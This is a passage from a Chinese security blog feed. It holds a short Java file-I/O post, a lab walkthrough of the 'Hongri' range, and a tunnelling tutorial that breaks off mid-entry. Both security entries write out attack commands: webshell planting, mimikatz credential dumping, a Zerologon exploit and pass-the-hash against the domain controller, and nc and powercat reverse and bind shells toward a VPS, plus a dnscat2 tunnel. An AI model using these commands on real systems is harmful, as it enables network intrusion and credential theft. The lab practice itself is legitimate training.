自带缓冲区</p></blockquote><p>读取和写入的操作类似</p><h3 id="字节流方法"><a href="#字节流方法" class="headerlink" title="字节流方法"></a><strong>字节流方法</strong></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 读取文件</span><br><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        File file = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;E:/test.txt&quot;</span>);<br>        FileInputStream fileInputStream = <span class="hljs-keyword">new</span> FileInputStream(file);<br>        <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">int</span> length = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> ((length = fileInputStream.read(bytes)) != -<span class="hljs-number">1</span>)&#123;<br>            System.out.println(<span class="hljs-keyword">new</span> String(bytes,<span class="hljs-number">0</span>,length));<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// read 是读取 bytes 长读的字节数</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 写入文件</span><br><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        File file = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;E:/test.txt&quot;</span>);<br>        FileOutputStream test = <span class="hljs-keyword">new</span> FileOutputStream(file);<br>        String str = <span class="hljs-string">&quot;hello lcdm123!!!&quot;</span>;<br>        <span class="hljs-comment">// 将字符串转换为二进制文件</span><br>        <span class="hljs-keyword">byte</span>[] b = str.getBytes();<br>        <span class="hljs-comment">// 写入</span><br>        test.write(b);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于文件的操作 Java 还有很多方法，需要后面遇到再做处理</p><blockquote><p>对于各类的操作直接看 java 文档就可以了</p></blockquote><p>参考文章</p><p><a href="https://blog.csdn.net/u013087513/article/details/51999533">https://blog.csdn.net/u013087513/article/details/51999533</a></p><p><a href="https://segmentfault.com/a/1190000038575475">https://segmentfault.com/a/1190000038575475</a></p><p><a href="https://www.cnblogs.com/shitouer/archive/2012/12/19/2823641.html">https://www.cnblogs.com/shitouer/archive/2012/12/19/2823641.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-文件系统&quot;&gt;&lt;a href=&quot;#Java-文件系统&quot; class=&quot;headerlink&quot; title=&quot;Java 文件系统&quot;&gt;&lt;/a&gt;Java 文件系统&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="编程语言" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>红日靶场一</title>
    <link href="http://example.com/2021/10/13/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/"/>
    <id>http://example.com/2021/10/13/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/</id>
    <published>2021-10-13T11:04:37.000Z</published>
    <updated>2021-10-23T03:21:30.283Z</updated>
    
    <content type="html"><![CDATA[<h1 id="红日靶场-一"><a href="#红日靶场-一" class="headerlink" title="红日靶场 一"></a>红日靶场 一</h1><blockquote><p>环境搭配没什么大问题，改一下host文件就可以了</p></blockquote><h2 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h2><p>弱口令进入后台，然后寻找 getshell 的突破口</p><blockquote><p>后台获取 shell 的突破口常常在 插件和模板这些地方</p></blockquote><p>在模板编辑处写入冰蝎马</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210901175424900.png" alt="image-20210901175424900"></p><p>然后找到模板保存位置，利用冰蝎连接<code>/yxcms/protected/apps/default/view/default/shell.php</code></p><p>获取到 shell 后就可以考虑上线 CS 和 MSF 了，常规步骤，利用 CS 建立监听器，然后生成 exe，上传到靶机，执行 exe，之后就可以上线了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210901180914459.png" alt="image-20210901180914459"></p><h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>查询当前用户 <code>whoami</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210901181220725.png" alt="image-20210901181220725"></p><blockquote><p>这里看到获取到的权限是 administrator 权限， 但是在 Windows 系统中，我们提权的目标是 SYSTEM 权限</p></blockquote><p>查看IP <code>ipconfig</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210901181439936.png" alt="image-20210901181439936"></p><blockquote><p>存在内网地址就可能有域，就会涉及到后期的域渗透</p></blockquote><p><code>net user</code> 本地账户</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902094457893.png" alt="image-20210902094457893"></p><p>获取系统信息 <code>systeminfo</code> </p><blockquote><p>执行这个命令 CS 上没有返回结果 ？？？ 蚁剑冰蝎上面也不可以</p></blockquote><p><code>ipconfig /all</code> 这样可以查看到主机所在的域</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902092825067.png" alt="image-20210902092825067"></p><p>查看当前登录域 <code>net config workstation</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902101455030.png" alt="image-20210902101455030"></p><p><code>wmic process get caption,commandline,processid /value</code> 查看运行的进程及路径（检查是否有杀软）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902093335151.png" alt="image-20210902093335151"></p><p>内网存活主机探测 <code> arp-scan.exe -t 10.10.3.0/24</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902095658350.png" alt="image-20210902095658350"></p><blockquote><p>存活的主机有 </p><p>10.10.3.131</p><p>10.10.3.132</p><p>10.10.3.133</p><p>可以选择多个工具扫描内网提高准确性</p></blockquote><p><code>ping god.org</code> 发现返回的 IP，确定 <code>10.10.3.131</code> 是域控</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902095939232.png" alt="image-20210902095939232"></p><p><strong>接下来可以主要收集域信息</strong></p><p>查询域 <code>net view /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902111026061.png" alt="image-20210902111026061"></p><p>查询域内所有计算机 <code>net view /domain:GOD</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902111236537.png" alt="image-20210902111236537"></p><p>域内用户 <code>net user /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902101310670.png" alt="image-20210902101310670"></p><p>查看域中的组 <code>net group /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902110326635.png" alt="image-20210902110326635"></p><blockquote><p>后面参考这个查看各组中的内容</p></blockquote><p>域管理员列表 <code>net group &quot;doamin admins&quot; /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902102913391.png" alt="image-20210902102913391"></p><p>域内查询域控<code>net group &quot;Domain Controllers&quot; /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902102826503.png" alt="image-20210902102826503"></p><p>域内服务器 <code>net group &quot;Domain computer&quot; /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902110517911.png" alt="image-20210902110517911"></p><blockquote><p>先收集这些，后面需要用的时候再来收集一下</p></blockquote><p>还有一个选择就是直接依靠插件，但是前期练习不推荐使用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210901181750768.png" alt="image-20210901181750768"></p><h3 id="获取域控权限"><a href="#获取域控权限" class="headerlink" title="获取域控权限"></a>获取域控权限</h3><p>首先使用 MS14-058 将 web 靶机提权</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902112119070.png" alt="image-20210902112119070"></p><p>开启远程桌面，放行 3389 端口</p><p>使用 mimikatz 抓取到本地的账户密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902114020655.png" alt="image-20210902114020655"></p><p>连接到远程桌面</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902142806122.png" alt="image-20210902142806122"></p><p>下一步获取域控权限</p><blockquote><p>获取域控权限的漏洞主要有 MS14-068  MS17-010  CVE-2020-1472  </p><p>最新的漏洞也不太了解</p></blockquote><p>可以先搭建内网代理，使 kali 能够访问到域控，这里选用 EW</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902115415971.png" alt="image-20210902115415971"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902115405766.png" alt="image-20210902115405766"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902115536863.png" alt="image-20210902115536863"></p><blockquote><p>连接成功，这样就可以利用 kali 访问到域控服务器了</p></blockquote><p>先为 msf 设置代理</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">setg Proxies socks5:<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.15</span>:<span class="hljs-number">6000</span><br>setg ReverseAllowProxy <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>可以使用 MS17-010 执行命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902121355745.png" alt="image-20210902121355745"></p><p><del>尝试添加用户并且开启远程桌面</del> 又没有成功，事实证明永恒之蓝也不是很好用</p><p>使用 CVE-2020-1472 获取域控权限</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="bash"> mimikatz <span class="hljs-string">&quot;lsadump::zerologon /target:10.10.3.131 /account:OWA$&quot;</span> <span class="hljs-string">&quot;exit&quot;</span>  <span class="hljs-comment"># 漏洞检测</span></span><br><span class="hljs-keyword">shell</span><span class="bash"> mimikatz <span class="hljs-string">&quot;lsadump::zerologon /target:10.10.3.131 /account:OWA$ /exploit&quot;</span> <span class="hljs-string">&quot;exit&quot;</span> <span class="hljs-comment"># 置零</span></span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902134502718.png" alt="image-20210902134502718"></p><p>抓取现在的 hash</p><p><code>proxychains python3 secretsdump.py god.org/OWA\$@10.10.3.131 -no-pass</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902135849535.png" alt="image-20210902135849535"></p><p>之后利用 wmiexec.py 连接域控，下载 sam 文件为后期恢复密码做准备</p><p> <code>proxychains python3 wmiexec.py -hashes :a45a7246dd74b64a67f22fd7020f1bd8 god.org/administrator@10.10.3.131</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902140447430.png" alt="image-20210902140447430"></p><blockquote><p>代理不够稳定，执行命令的时候特别卡</p><p>动作要快！！ 添加用户，开启远程桌面</p></blockquote><p>然后恢复密码，先从之前下载的 save 文件中提取出 Hash</p><p><code>python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902145355281.png" alt="image-20210902145355281"></p><p>恢复密码</p><p><code>proxychains python3 reinstall_original_pw.py OWA 10.10.3.131 1ce6842c848ce11741dc8f6932856bae</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902145420146.png" alt="image-20210902145420146"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902145912439.png" alt="image-20210902145912439"></p><p><del>后面可以利用 IPC 连接域控，然后上传 CS 的 payload</del></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902150224971.png" alt="image-20210902150224971"></p><p><del>利用 PsExec 远程连接到域控主机，执行 CS Payload 上线 CS</del></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902150932353.png" alt="image-20210902150932353"></p><blockquote><p>上面的方法有点麻烦</p></blockquote><p>直接在 CS 上建立一个 SMB 监听，然后利用现有的 会话派生一个会话出来，之后在探测到内网存活主机的地方填入添加的用户，选择派生出来的会话和 SMB 监听，直接连接就可以上线 CS 了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902153435066.png" alt="image-20210902153435066"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902153458562.png" alt="image-20210902153458562"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902153514666.png" alt="image-20210902153514666"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902153545740.png" alt="image-20210902153545740"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902153629576.png" alt="image-20210902153629576"></p><p>以同样的方法可以获取到内网另一台主机的会话，这样就可以拿下了域内所有权限了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902153812422.png" alt="image-20210902153812422"></p><p><img src="D:\markdown\image-20210902153827988.png" alt="image-20210902153827988"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶场是我第二遍打了，整体比较简单，主要是为了熟练流程和工具的使用。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;红日靶场-一&quot;&gt;&lt;a href=&quot;#红日靶场-一&quot; class=&quot;headerlink&quot; title=&quot;红日靶场 一&quot;&gt;&lt;/a&gt;红日靶场 一&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;环境搭配没什么大问题，改一下host文件就可以了&lt;/p&gt;
&lt;/blockquote</summary>
      
    
    
    
    <category term="内网" scheme="http://example.com/categories/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网隧道搭建</title>
    <link href="http://example.com/2021/10/13/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/"/>
    <id>http://example.com/2021/10/13/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/</id>
    <published>2021-10-13T11:01:14.000Z</published>
    <updated>2021-10-13T11:02:02.251Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网隧道搭建实践"><a href="#内网隧道搭建实践" class="headerlink" title="内网隧道搭建实践"></a>内网隧道搭建实践</h1><h2 id="netsh隧道搭建"><a href="#netsh隧道搭建" class="headerlink" title="netsh隧道搭建"></a>netsh隧道搭建</h2><p>  跳板机：win7    内网主机：Centos 7</p><h3 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h3><p>利用边界的被拿下的web服务器建立端口转发规则，使问利用web服务器作为跳板与内网主机建立联系</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091644761.png" alt="image-20210805091644761"></p><p>在win7中执行：<code>netsh interface portproxy add v4tov4 listenport=4567 connectaddress=10.10.3.129 connectport=22</code>（需要管理员权限）</p><p>查看是否开启：<code>netsh interface portproxy show all</code></p><p>删除规则：<code>netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4567</code></p><p>测试端口转发结果，连接成功</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804114121495.png" alt="image-20210804114121495"></p><h3 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a>场景二</h3><p>本地防火墙只允许某些端口出网，可以利用netsh搭建本地端口转发，将不允许出网的端口转发到白名单端口上<code>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=12345 connectaddress=127.0.0.1 connectport=3389</code></p><p>或者利用netsh操作本地的防火墙设置</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;openRDP&quot;</span> <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">protocol</span>=tcp <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow  # 开放防火墙端口<br>netsh advfirewall<span class="hljs-built_in"> firewall </span>delete rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;openRDP&quot;</span> <span class="hljs-attribute">protocol</span>=tcp <span class="hljs-attribute">localport</span>=3389 #删除规则<br></code></pre></td></tr></table></figure><h2 id="LCX端口代理"><a href="#LCX端口代理" class="headerlink" title="LCX端口代理"></a>LCX端口代理</h2><p>Windows的为lcx.exe，Linux的为portmap（这个工具有点老了）</p><p>下载：<a href="https://github.com/UndefinedIdentifier/LCX">https://github.com/UndefinedIdentifier/LCX</a></p><h3 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091741766.png" alt="image-20210805091741766"></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl">windows：lcx.exe -slave vps-ip vps-port  <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> port 本地端口转发到VPS<br>lcx.exe -slave <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> <span class="hljs-number">5234</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">3389</span><br>lcx.exe -<span class="hljs-section">listen</span> <span class="hljs-number">5234</span> <span class="hljs-number">33891</span><br></code></pre></td></tr></table></figure><p>将本地端口转发到VPS上</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804142654140.png" alt="image-20210804142654140"></p><blockquote><p>可能是工具太老了，连接上一会就自动断开了</p></blockquote><h3 id="内网主机端口转发"><a href="#内网主机端口转发" class="headerlink" title="内网主机端口转发"></a>内网主机端口转发</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091809826.png" alt="image-20210805091809826"></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lsl">web服务器上：Lcx.exe -slave  vps-ip  vps-port  内网主机ip  内网主机目标端口<br>Lcd.exe -slave <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> <span class="hljs-number">5234</span> <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.6</span> <span class="hljs-number">22</span><br><br>vps：Lcx.exe -<span class="hljs-section">listen</span> vps-port 内网主机目标端口<br>Lcx.exe -<span class="hljs-section">listen</span> <span class="hljs-number">5234</span> <span class="hljs-number">221</span><br></code></pre></td></tr></table></figure><p>VPS与web服务器建立通道，将内网主机端口转发到VPS上</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804143305962.png" alt="image-20210804143305962"></p><p>利用通道连接到内网主机</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804143224155.png" alt="image-20210804143224155"></p><h2 id="NetCat代理"><a href="#NetCat代理" class="headerlink" title="NetCat代理"></a>NetCat代理</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091925952.png" alt="image-20210805091925952"></p><h3 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">web</span>服务器：nc<span class="hljs-number">64</span>.exe -lvp <span class="hljs-number">4445</span> -e c:\Windows\System<span class="hljs-number">32</span>\cmd.exe  监听连接请求<br><span class="hljs-attribute">VPS</span>：nc<span class="hljs-number">64</span>.exe web-ip <span class="hljs-number">4445</span>  请求连接<br></code></pre></td></tr></table></figure><p>连接成功获取到shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804145253006.png" alt="image-20210804145253006"></p><h3 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">web服务器：nc64.exe vps-ip vps-port -e c:\Windows\System32\cmd.exe<br>VPS：nc64.exe -lvp<span class="hljs-built_in"> port </span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804145741200.png" alt="image-20210804145741200"></p><blockquote><p>个人觉得不用太纠结正反，能连上就可以了 =_=</p></blockquote><h2 id="PowerCat代理"><a href="#PowerCat代理" class="headerlink" title="PowerCat代理"></a>PowerCat代理</h2><blockquote><p>PowerCat 是nc的powershell版 ，使用方法和nc差不多</p></blockquote><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">上传到web服务器中，然后修改服务器powershell策略并导入脚本<br><span class="hljs-keyword">Set</span>-ExecutionPolicy remotesigned <br><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\powercat.ps1<br></code></pre></td></tr></table></figure><h3 id="正向连接shell"><a href="#正向连接shell" class="headerlink" title="正向连接shell"></a>正向连接shell</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091942498.png" alt="image-20210805091942498"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PowerCat</span>：powercat -l -p <span class="hljs-number">6666</span> -e cmd.exe -v<br><span class="hljs-attribute">vps</span>：nc<span class="hljs-number">64</span>.exe web-ip <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804155833809.png" alt="image-20210804155833809"></p><h3 id="反向连接shell"><a href="#反向连接shell" class="headerlink" title="反向连接shell"></a>反向连接shell</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091945928.png" alt="image-20210805091945928"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">PowerCat：powercat -c <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> -p <span class="hljs-number">6666</span> -e cmd.exe -v<br>vps：nc64.exe -lvp <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804160206174.png" alt="image-20210804160206174"></p><h3 id="搭建DNS隧道"><a href="#搭建DNS隧道" class="headerlink" title="搭建DNS隧道"></a>搭建DNS隧道</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805092300471.png" alt="image-20210805092300471"></p><blockquote><p>PowerCat的DNS通信是基于<code>dnscat</code>设计的，在使用<code>dnscat</code>之前需要下载和进行编译</p></blockquote><p>Kali下载dnscat2</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/iagox86/</span>dnscat2.git<br>cd dnscat2<span class="hljs-regexp">/server/</span><br>gem install bundler<br>bundle install<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804162355288.png" alt="image-20210804162355288"></p><p>kali执行：<code>ruby dnscat2.rb ttpowercat.test -e open --no-cache</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804162932809.png" alt="image-20210804162932809"></p><p>web主机：<code>powercat -c kali-ip -p 53 -dns ttpowercat.test -e cmd.exe </code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804163057542.png" alt="image-20210804163057542"></p><p>kali执行：<code>session -i 1</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804163157341.png" alt="image-20210804163157341"></p><p>搭建成功</p><h3 id="跳板NC隧道"><a href="#跳板NC隧道" class="headerlink" title="跳板NC隧道"></a>跳板NC隧道</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805092357659.png" alt="image-20210805092357659"></p><p>将域控制器交互到kali</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">内网主机：powercat -l -v -p <span class="hljs-number">9999</span> -e cmd.exe<br>web服务器：powercat -l -v -p <span class="hljs-number">2345</span> -r tcp:内网主机ip:<span class="hljs-number">9999</span><br>kali：nc web-ip <span class="hljs-number">2345</span> -vv<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804171831544.png" alt="image-20210804171831544"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804171903589.png" alt="image-20210804171903589"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804171720544.png" alt="image-20210804171720544"></p><h3 id="跳板DNS隧道"><a href="#跳板DNS隧道" class="headerlink" title="跳板DNS隧道"></a>跳板DNS隧道</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805092426042.png" alt="image-20210805092426042"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">web</span>服务器：<span class="hljs-selector-tag">powercat</span> <span class="hljs-selector-tag">-l</span> <span class="hljs-selector-tag">-v</span> <span class="hljs-selector-tag">-p</span> 8000 <span class="hljs-selector-tag">-r</span> <span class="hljs-selector-tag">dns</span><span class="hljs-selector-pseudo">:kali-ip</span><span class="hljs-selector-pseudo">::ttpowercat.test</span><br><span class="hljs-selector-tag">kali</span>：<span class="hljs-selector-tag">ruby</span> <span class="hljs-selector-tag">dnscat2</span><span class="hljs-selector-class">.rb</span> <span class="hljs-selector-tag">ttpowercat</span><span class="hljs-selector-class">.test</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">open</span> <span class="hljs-selector-tag">--no-cache</span><br>内网：<span class="hljs-selector-tag">powercat</span> <span class="hljs-selector-tag">-c</span> 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.3</span><span class="hljs-selector-class">.131</span> <span class="hljs-selector-tag">-p</span> 8000 <span class="hljs-selector-tag">-v</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">cmd</span><span class="hljs-selector-class">.exe</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804172742238.png" alt="image-20210804172742238"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804172718398.png" alt="image-20210804172718398"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804172759548.png" alt="image-20210804172759548"></p><p>获取到shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804172833678.png" alt="image-20210804172833678"></p><h2 id="frp内网穿透"><a href="#frp内网穿透" class="headerlink" title="frp内网穿透"></a>frp内网穿透</h2><p>下载：<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><p>frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。frp和端口转发并不是一样的，这样的frp是使用了内网的全端口全流量的</p><h3 id="一级代理"><a href="#一级代理" class="headerlink" title="一级代理"></a>一级代理</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805101242047.png" alt="image-20210805101242047"></p><p>利用win10作为服务端，Web作为客户端搭建内网代理</p><figure class="highlight 